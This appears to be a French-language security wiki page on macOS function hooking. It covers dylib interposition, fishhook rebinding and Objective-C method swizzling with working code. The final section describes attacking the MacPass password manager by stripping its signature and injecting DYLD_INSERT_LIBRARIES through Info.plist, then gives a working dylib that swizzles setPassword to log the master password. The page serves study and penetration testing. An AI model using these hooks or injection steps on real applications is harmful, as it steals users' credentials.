# Hooking de fonctions macOS

{{#include ../../../banners/hacktricks-training.md}}

## Interposition de fonctions

Create a **dylib** with an **`__interpose` (`__DATA___interpose`)** section (or a section flagged with **`S_INTERPOSING`**) containing tuples of **function pointers** that refer to the **original** and the **replacement** functions.

Then, **inject** the dylib with **`DYLD_INSERT_LIBRARIES`** (l’interposition doit avoir lieu avant le chargement de l’application principale). Évidemment, les [**restrictions** appliquées à l’utilisation de **`DYLD_INSERT_LIBRARIES`** s’appliquent également ici](macos-library-injection/index.html#check-restrictions).

### Interposer printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> La variable d'environnement **`DYLD_PRINT_INTERPOSING`** peut être utilisée pour déboguer l'interposing et affichera le processus d'interposing.

Notez également que **l'interposing se produit entre le processus et les bibliothèques chargées** ; cela ne fonctionne pas avec le cache des bibliothèques partagées.

### Dynamic Interposing

Il est également possible d'effectuer dynamiquement l'interposing d'une fonction à l'aide de la fonction **`dyld_dynamic_interpose`**. Cela permet d'effectuer **programmatiquement** l'interposing d'une fonction au **runtime**, au lieu de le faire uniquement au **début**.

Il suffit d'indiquer les **tuples** de la **fonction à remplacer et de la fonction de remplacement**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

Si vous disposez déjà d'une exécution de code **à l'intérieur du processus** et que vous souhaitez hooker une **fonction C importée** sans relancer la cible, une primitive très courante est le **symbol rebinding** (popularisé par **`fishhook`**).

Au lieu d'utiliser la section **`__interpose`**, cette technique parcourt les métadonnées Mach-O (`__LINKEDIT` -> table des symboles indirects -> `__la_symbol_ptr` / `__nl_symbol_ptr`) et **écrase le slot d'importation** utilisé par l'image actuelle. Cela est très utile pour hooker des fonctions dans un processus **déjà en cours d'exécution** ou pour hooker **une seule image** avec **`rebind_symbols_image`**.<sup>[2]</sup>

> [!TIP]
> Cela n'affecte que les appels qui passent réellement par un **pointeur d'importation**. Si la fonction cible est **appelée directement dans la même image**, il n'existe aucun slot importé à réécrire ; cette technique ne détectera donc pas ce site d'appel.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Dans les versions récentes de macOS, de nombreuses cibles de rebinding ne se trouvent plus dans des pages **`__DATA`** accessibles en écriture. Les outils de rebinding doivent généralement rendre temporairement **`__DATA_CONST`** accessible en écriture avant de modifier le pointeur. De plus, sur Apple Silicon / **`arm64e`**, vous devez vous attendre à trouver des pointeurs authentifiés ainsi qu'une indirection supplémentaire dans **`__AUTH_CONST.__auth_got`**. Ainsi, un outil de rebinding qui analyse uniquement les sections classiques de pointeurs de symboles lazy/non-lazy peut manquer certains points d'appel.<sup>[3]</sup>

> [!CAUTION]
> L'ABI **`arm64e`** utilise la **Pointer Authentication (PAC)** pour de nombreux pointeurs de fonctions. Les écritures directes de pointeurs qui fonctionnaient auparavant sur Intel peuvent casser un point d'appel sur Apple Silicon. Lorsque vous écrivez votre propre outil de rebinding ou hooker inline, soyez prêt à utiliser des helpers de **`<ptrauth.h>`** tels que **`ptrauth_sign_unauthenticated`** ou **`ptrauth_auth_and_resign`**, et testez spécifiquement sur des cibles **`arm64e`**.

Pour plus de détails sur **`__AUTH`**, **`__AUTH_CONST`** et **`__auth_got`**, consultez [cette page](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

En ObjectiveC, voici comment une méthode est appelée : **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

L'**objet**, la **méthode** et les **paramètres** sont nécessaires. Lorsqu'une méthode est appelée, un **msg est envoyé** à l'aide de la fonction **`objc_msgSend`** : `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

L'objet est **`someObject`**, la méthode est **`@selector(method1p1:p2:)`** et les arguments sont **value1** et **value2**.

En suivant les structures des objets, il est possible d'atteindre un **tableau de méthodes** où sont **situés** les **noms** et les **pointeurs** vers le code des méthodes.

> [!CAUTION]
> Notez que, puisque les méthodes et les classes sont accessibles en fonction de leurs noms, ces informations sont stockées dans le binaire. Il est donc possible de les récupérer avec `otool -ov </path/bin>` ou [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accéder aux méthodes brutes

Il est possible d'accéder aux informations des méthodes, telles que le nom, le nombre de paramètres ou l'adresse, comme dans l'exemple suivant :
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling avec method_exchangeImplementations

La fonction **`method_exchangeImplementations`** permet de **modifier** l’**adresse** de l’**implémentation** d’**une fonction pour celle de l’autre**.

> [!CAUTION]
> Ainsi, lorsqu’une fonction est appelée, **c’est l’autre qui est exécutée**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> Dans ce cas, si le **code d’implémentation de la méthode legit** **vérifie** le **nom** de la **méthode**, il pourrait **détecter** ce swizzling et empêcher son exécution.
>
> La technique suivante ne présente pas cette restriction.

### Method Swizzling with method_setImplementation

Le format précédent est étrange, car vous modifiez l’implémentation de 2 méthodes, l’une avec celle de l’autre. En utilisant la fonction **`method_setImplementation`**, vous pouvez **modifier** l’**implémentation** d’une **méthode pour l’autre**.

N’oubliez pas de **stocker l’adresse de l’implémentation de la méthode originale** si vous comptez l’appeler depuis la nouvelle implémentation, avant de l’écraser, car il sera ensuite beaucoup plus compliqué de retrouver cette adresse.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Méthodologie d’attaque par Hooking

Sur cette page, différentes façons de hooker des fonctions ont été présentées. Cependant, elles impliquaient toutes d’**exécuter du code à l’intérieur du processus ciblé**.

Pour cela, la technique la plus simple consiste à injecter un [Dyld via des variables d’environnement ou par hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Cependant, je suppose que cela pourrait également être fait via une [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Toutefois, ces deux options sont **limitées** aux binaires/processus **non protégés**. Consultez chaque technique pour en savoir plus sur ses limitations.

Cependant, une attaque par function hooking est très spécifique : un attaquant effectuera cette opération pour **voler des informations sensibles depuis l’intérieur d’un processus** (sinon, il effectuerait simplement une process injection attack). Ces informations sensibles peuvent se trouver dans des Apps téléchargées par l’utilisateur, telles que MacPass.

Le vecteur d’attaque consisterait donc soit à trouver une vulnérabilité, soit à supprimer la signature de l’application, puis à injecter la variable d’environnement **`DYLD_INSERT_LIBRARIES`** via le fichier Info.plist de l’application, en ajoutant quelque chose comme :
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
puis **réenregistrer** l’application :
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Ajoutez dans cette library le code de hooking pour exfiltrer les informations : mots de passe, messages...

> [!CAUTION]
> Notez que dans les versions plus récentes de macOS, si vous **retirez la signature** du binaire de l'application et que celui-ci a déjà été exécuté, macOS **n'exécutera plus l'application**.

#### Exemple de library
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Références

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook : A library that simplifies the process of dynamically rebinding symbols in Mach-O binaries](https://github.com/facebook/fishhook)
- [3] [Pointer Authentication — Clang Documentation](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
